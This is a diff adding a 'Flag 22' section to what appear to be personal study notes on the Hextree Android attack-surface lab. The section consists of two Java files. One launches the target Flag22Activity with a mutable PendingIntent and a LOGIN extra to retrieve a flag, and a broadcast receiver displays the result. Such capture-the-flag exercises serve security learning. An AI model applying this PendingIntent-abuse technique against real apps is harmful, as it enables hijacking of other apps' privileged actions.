@@ -549,3 +549,111 @@ public class HextreeActivity extends AppCompatActivity {
 ![[Pasted image 20260529135440.png]]
 
 ![[Pasted image 20260529135517.png]]
+
+# FLag 22
+
+```
+package com.example.hextree;  
+  
+import android.app.PendingIntent;  
+import android.content.ComponentName;  
+import android.content.Intent;  
+import android.os.Bundle;  
+import android.widget.Button;  
+import android.widget.Toast;  
+  
+import androidx.annotation.Nullable;  
+import androidx.appcompat.app.AppCompatActivity;  
+  
+public class HextreeActivity extends AppCompatActivity {  
+  
+    private static final int REQUEST_CODE = 1337;  
+  
+    @Override  
+    protected void onCreate(Bundle savedInstanceState) {  
+        super.onCreate(savedInstanceState);  
+        setContentView(R.layout.activity_main);  
+  
+        // Part 1: Handle incoming result requests (used for previous flags like Flag 12)  
+        if (getCallingActivity() != null) {  
+            Toast.makeText(this, "Called by: " + getCallingActivity().getClassName(), Toast.LENGTH_SHORT).show();  
+            Intent resultIntent = new Intent();  
+            resultIntent.putExtra("token", 1094795585);   
+            setResult(RESULT_OK, resultIntent);  
+            finish();  
+        }  
+  
+        Button btn = findViewById(R.id.btn_launch_activity);  
+  
+        btn.setOnClickListener(v -> {  
+            // Part 2: Solve Flag 22 using a PendingIntent  
+                        // 1. Create an Intent targeting our BroadcastReceiver  
+            Intent receiverIntent = new Intent(this, FlagReceiver.class);  
+              
+            // 2. Create a PendingIntent for that BroadcastReceiver  
+            // Note: FLAG_MUTABLE is required since Flag22Activity will fill in extras            PendingIntent pendingIntent = PendingIntent.getBroadcast(  
+                    this,   
+                    0,   
+                    receiverIntent,   
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE  
+            );  
+  
+            // 3. Create the launch Intent for Flag22Activity  
+            Intent attackIntent = new Intent();  
+            attackIntent.setComponent(  
+                    new ComponentName(  
+                            "io.hextree.attacksurface",  
+                            "io.hextree.attacksurface.activities.Flag22Activity"  
+                    )  
+            );  
+  
+            // 4. Add the PendingIntent as an extra named "PENDING"  
+            attackIntent.putExtra("PENDING", pendingIntent);  
+            attackIntent.putExtra("LOGIN", true);  
+  
+            // 5. Launch the activity  
+            startActivity(attackIntent);  
+        });  
+    }  
+  
+    @Override  
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {  
+        super.onActivityResult(requestCode, resultCode, data);  
+  
+        if (requestCode == REQUEST_CODE) {  
+            Toast.makeText(this, "Returned from activity", Toast.LENGTH_LONG).show();  
+            if (data != null && data.getExtras() != null) {  
+                Toast.makeText(this, data.getExtras().toString(), Toast.LENGTH_LONG).show();  
+            }  
+        }  
+    }  
+}
+```
+
+```
+package com.example.hextree;  
+  
+import android.content.BroadcastReceiver;  
+import android.content.Context;  
+import android.content.Intent;  
+import android.util.Log;  
+import android.widget.Toast;  
+  
+public class FlagReceiver extends BroadcastReceiver {  
+    @Override  
+    public void onReceive(Context context, Intent intent) {  
+        // Retrieve values returned by Flag22Activity  
+        boolean success = intent.getBooleanExtra("success", false);  
+        String flag = intent.getStringExtra("flag");  
+  
+        String message = "Success: " + success + "\nFlag: " + flag;  
+          
+        // Log the result  
+        Log.d("Flag22", message);  
+          
+        // Display the result  
+        Toast.makeText(context, message, Toast.LENGTH_LONG).show();  
+    }  
+}
+```
+
